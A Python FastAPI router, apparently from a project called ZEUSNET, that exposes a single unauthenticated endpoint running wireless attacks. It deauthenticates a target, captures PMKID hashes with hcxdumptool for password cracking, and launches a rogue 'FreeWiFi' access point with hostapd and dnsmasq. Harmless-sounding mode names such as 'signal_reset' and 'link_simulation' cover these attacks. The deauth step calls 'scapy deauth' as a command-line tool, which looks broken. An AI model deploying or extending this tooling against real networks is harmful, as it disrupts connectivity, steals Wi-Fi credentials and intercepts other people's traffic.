import os
import subprocess
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from backend import settings

def get_current_mode() -> str:
    """Return the latest ZEUSNET mode."""

    return os.getenv("ZEUSNET_MODE", settings.ZEUSNET_MODE).upper()

RETRY_LIMIT = int(os.getenv("RETRY_LIMIT", settings.RETRY_LIMIT))

router = APIRouter()


class AttackRequest(BaseModel):
    """Schema for network operations."""

    mode: str  # signal_reset, pmkid_probe, link_simulation
    target: str | None = None
    channel: int = 6


def safe_only_guard() -> None:
    """Block aggressive actions if running in SAFE mode."""

    if get_current_mode() == "SAFE":
        raise HTTPException(status_code=403, detail="Operation disabled in SAFE mode.")


@router.post("/nic/attack")
def handle_network_ops(req: AttackRequest) -> dict:
    """Dispatch network operation based on the requested mode."""

    if req.mode == "signal_reset":
        return perform_deauth(req)
    if req.mode == "pmkid_probe":
        return capture_pmkid(req)
    if req.mode == "link_simulation":
        return simulate_ap(req)
    raise HTTPException(status_code=400, detail="Invalid operation mode.")


def perform_deauth(req: AttackRequest) -> dict:
    safe_only_guard()
    try:
        cmd = [
            "scapy",
            "deauth",
            "--target",
            req.target or "",
            "--channel",
            str(req.channel),
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return {"status": "ok", "log": result.stdout}
    except Exception as exc:  # pragma: no cover - system call
        raise HTTPException(status_code=500, detail=str(exc)) from exc


def capture_pmkid(req: AttackRequest) -> dict:
    safe_only_guard()
    try:
        cmd = [
            "hcxdumptool",
            "-i",
            "wlan0mon",
            "-o",
            "/tmp/pmkid.pcapng",
            "--enable_status=15",
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return {"status": "ok", "log": result.stdout}
    except Exception as exc:  # pragma: no cover - system call
        raise HTTPException(status_code=500, detail=str(exc)) from exc


def simulate_ap(req: AttackRequest) -> dict:
    safe_only_guard()
    try:
        hostapd_cfg = f"""
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel={req.channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        with open("/tmp/rogue_ap.conf", "w", encoding="utf-8") as f:
            f.write(hostapd_cfg)

        subprocess.Popen(
            ["hostapd", "/tmp/rogue_ap.conf"]
        )  # pragma: no cover - system call
        subprocess.Popen(
            ["dnsmasq", "--conf-file=/etc/zeusnet/dnsmasq.conf"]
        )  # pragma: no cover

        return {"status": "ok", "message": "Rogue AP deployed."}
    except Exception as exc:  # pragma: no cover - system call
        raise HTTPException(status_code=500, detail=str(exc)) from exc
